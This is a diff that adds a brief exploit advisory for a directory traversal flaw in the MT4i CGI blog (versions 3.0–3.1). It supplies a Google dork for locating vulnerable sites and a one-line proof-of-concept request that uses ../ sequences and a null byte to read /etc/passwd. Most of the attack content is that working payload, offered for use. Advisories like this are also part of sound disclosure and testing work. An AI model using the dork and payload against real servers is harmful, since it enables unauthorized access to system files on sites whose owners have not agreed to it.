@@ -1,0 +1,14 @@
+# Exploit Title: MT4I CGI blog Directory traversal vulnerabilities
+# Google Dork: inurl:"mt4i/mt4i.cgi"
+# Date: 11.05.2012
+# Author: akast, akast@ngsst.com (neuron security team, http://www.ngsst.com)
+# Software Link: http://hazama.nu/pukiwiki/?MT4i
+# Version: MT4i 3.0  3.1
+# Tested on: Microsoft Windows 7
+
+===
+POC
+===
+
+/mt4i/mt4i.cgi?eid=1&from=&id=../../../../../../../../../../etc/passwd%00.png
+
